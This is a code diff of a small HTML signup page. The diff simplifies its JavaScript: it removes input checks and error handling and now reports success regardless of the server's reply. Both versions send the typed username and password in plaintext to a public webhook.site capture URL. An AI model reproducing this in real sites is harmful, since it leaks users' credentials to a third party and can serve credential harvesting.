@@ -109,58 +109,38 @@
     <div class="message" id="message"></div>
   </div>
 
-  <script>
+<script>
     function signup() {
       const user = document.getElementById("username").value.trim();
       const pass = document.getElementById("password").value.trim();
-      const message = document.getElementById("message");
-      const btn = document.getElementById("signupBtn");
+      const msg = document.getElementById("message");
 
-      // Clear any previous messages
-      message.textContent = "";
-      message.style.color = "#fff";
-
-      // Basic validation
       if (!user || !pass) {
-        message.style.color = "salmon";
-        message.textContent = "Please fill in both fields.";
+        msg.textContent = "Please fill in both fields.";
+        msg.style.color = "red";
         return;
       }
 
-      // Optional: stronger password or username checks
-      if (user.includes(" ") || pass.includes(" ")) {
-        message.style.color = "salmon";
-        message.textContent = "No spaces allowed in username or password.";
-        return;
-      }
+      msg.textContent = "Signing up...";
+      msg.style.color = "black";
 
-      btn.disabled = true; // Disable to prevent multiple clicks
-
-      const webhookURL = "https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916";
-
-      fetch(webhookURL, {
+      fetch("https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username: user, password: pass })
       })
-      .then(response => {
-        if (response.ok) {
-          message.style.color = "lightgreen";
-          message.textContent = "Signup successful!";
-        } else {
-          throw new Error("Server returned an error");
-        }
+      .then(res => {
+        msg.style.color = "green";
+        msg.textContent = "Signup successful!";
       })
-      .catch(error => {
-        console.error("Error:", error);
-        message.style.color = "salmon";
-        message.textContent = "Error sending data to webhook.";
-      })
-      .finally(() => {
-        btn.disabled = false; // Re-enable button
+      .catch(err => {
+        msg.style.color = "red";
+        msg.textContent = "Signup failed.";
+        console.error(err);
       });
     }
   </script>
+
 
 </body>
 </html>
